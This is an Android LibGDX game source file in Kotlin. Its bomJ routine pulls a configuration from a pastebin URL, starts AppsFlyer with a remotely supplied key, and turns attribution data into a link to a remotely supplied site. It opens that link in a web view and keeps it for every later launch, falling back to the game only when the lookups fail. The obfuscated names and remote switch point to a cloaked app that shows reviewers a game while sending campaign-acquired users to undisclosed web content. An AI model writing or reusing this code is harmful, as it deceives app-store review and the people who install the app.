package com.fincarable.kapletaloverno.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.fincarable.kapletaloverno.GameActivity
import com.fincarable.kapletaloverno.appContext
import com.fincarable.kapletaloverno.game.manager.MusicManager
import com.fincarable.kapletaloverno.game.manager.NavigationManager
import com.fincarable.kapletaloverno.game.manager.SoundManager
import com.fincarable.kapletaloverno.game.manager.SpriteManager
import com.fincarable.kapletaloverno.game.manager.util.MusicUtil
import com.fincarable.kapletaloverno.game.manager.util.SoundUtil
import com.fincarable.kapletaloverno.game.manager.util.SpriteUtil
import com.fincarable.kapletaloverno.game.screens.LoaderScreen
import com.fincarable.kapletaloverno.game.utils.GColor
import com.fincarable.kapletaloverno.game.utils.advanced.AdvancedGame
import com.fincarable.kapletaloverno.game.utils.disposeAll
import com.fincarable.kapletaloverno.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

class LibGDXGame(val activity: GameActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val loader by lazy { SpriteUtil.Loader() }
    val all    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GColor.text
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        bomJ()
    }

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("Strastno", MODE_PRIVATE)

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun bomJ() {
        log("bomJ")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val myFile = sharedPreferences.getString("dim", "ulica") ?: "ulica"

        try {
            if (myFile == "ulica") {
                coroutine.launch(Dispatchers.Main) {
                    val fileJs = withContext(Dispatchers.IO) { requestGet() }

                    if (fileJs != null) {
                        AppsFlyerLib.getInstance().init(fileJs.brateslava, getAppsFlyerConversionListener(fileJs.fincarton), appContext)
                        AppsFlyerLib.getInstance().start(activity, fileJs.brateslava, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(myFile)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<FinJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/RNZscsZ5"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = FinJSON(
                    fincarton  = jsonResponse.getString("fincarton")  ?: "",
                    brateslava = jsonResponse.getString("brateslava") ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class FinJSON(val fincarton: String, val brateslava: String)

    private fun getAppsFlyerConversionListener(miracle: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$miracle?caf=$campaign&afaci=$afAd&dicif=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("dim", link).apply() }
                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}